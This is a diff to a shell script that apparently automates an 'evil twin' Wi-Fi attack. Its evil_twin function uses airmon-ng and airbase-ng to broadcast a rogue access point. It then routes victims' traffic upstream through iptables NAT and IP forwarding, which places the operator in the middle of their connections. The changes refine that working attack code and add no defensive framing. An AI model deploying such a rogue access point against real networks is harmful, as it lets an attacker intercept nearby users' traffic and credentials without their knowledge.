@@ -29,21 +29,21 @@ function print_help() {
 }
 
 function connect_wifi() {
-	wpa_supplicant -B -i $RADIO_CLIENT -c <(wpa_passphrase $SSID $PASS)
+	wpa_supplicant -B -i $1 -c <(wpa_passphrase $SSID $PASS)
 }
 
 function evil_twin() {
 	ip link set $RADIO_AP down
 	iw dev $RADIO_AP set monitor none
 	airmon-ng start $RADIO_AP
-	airbase-ng -e $AP_SSID $RADIO_AP 2>&1 > $LOG_F &
+	airbase-ng -e $AP_SSID -c 11 $RADIO_AP 2>&1 > $LOG_F &
 	while ! grep -q "Access Point with BSSID" $LOG_F; do
 		sleep 1
 	done
-	connect_wifi
-	ifconfig at0 up
-	ifconfig at0 192.168.1.1 netmask 255.255.255.0
-	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+	connect_wifi $RADIO_CLIENT
+	ip link set at0 up
+	ip addr add 192.168.99.1/24 dev at0
+	route add -net 192.168.99.0 netmask 255.255.255.0 gw 192.168.99.1
 	iptables -P FORWARD ACCEPT
 	iptables -t nat -A POSTROUTING -o $RADIO_CLIENT -j MASQUERADE
 	echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -72,7 +72,7 @@ function wifi() {
 			iw $RADIO_CLIENT scan | grep "SSID:"
 			;;
 		connect)
-			connect_wifi
+			connect_wifi $RADIO_CLIENT
 			;;
 		*)
 			print_help
